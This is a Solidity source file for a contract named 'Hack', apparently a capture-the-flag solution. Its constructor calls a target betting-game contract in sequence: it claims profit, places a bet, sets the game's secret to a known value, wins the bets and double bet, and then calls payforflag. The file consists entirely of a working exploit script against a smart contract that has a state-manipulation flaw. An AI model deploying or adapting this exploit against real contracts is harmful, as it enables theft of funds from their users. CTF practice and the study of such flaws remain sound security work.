pragma solidity ^0.8.11;


import "console.sol";


contract Hack {
    constructor(address _target) {
        bool success;
        bytes memory result;

        (success, result) = _target.call(abi.encodeWithSignature("profit()"));
        require(success);

        (success, result) = _target.call(abi.encodeWithSignature("Bet()"));
        require(success);

        (success, result) = _target.call(abi.encodeWithSignature("setsecret(uint256)", 0x42));
        require(success);

        (success, result) = _target.call(abi.encodeWithSignature("betgame(uint256)", 0x42));
        require(success);

        (success, result) = _target.call(abi.encodeWithSignature("betgame(uint256)", 1234));
        require(success);

        (success, result) = _target.call(abi.encodeWithSignature("doublebetgame(uint256)", 1234));
        require(success);

        (success, result) = _target.call(abi.encodeWithSignature("payforflag(string)", "hello"));
        require(success);
    }
}


